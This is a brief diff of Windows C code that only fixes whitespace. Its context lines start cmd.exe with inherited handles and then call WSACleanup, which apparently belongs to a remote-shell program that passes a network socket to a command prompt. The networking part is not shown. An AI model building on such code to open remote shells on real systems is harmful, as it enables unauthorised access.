@@ -62,7 +62,7 @@ int _tmain(void*)
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&pi, sizeof(pi));
 
-	 LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe";
+	LPCWSTR cmd = L"C:\\Windows\\System32\\cmd.exe";
 
 	if (!CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
 	{
@@ -79,4 +79,5 @@ int _tmain(void*)
 	WSACleanup();
 
 	return 0;
+
 }
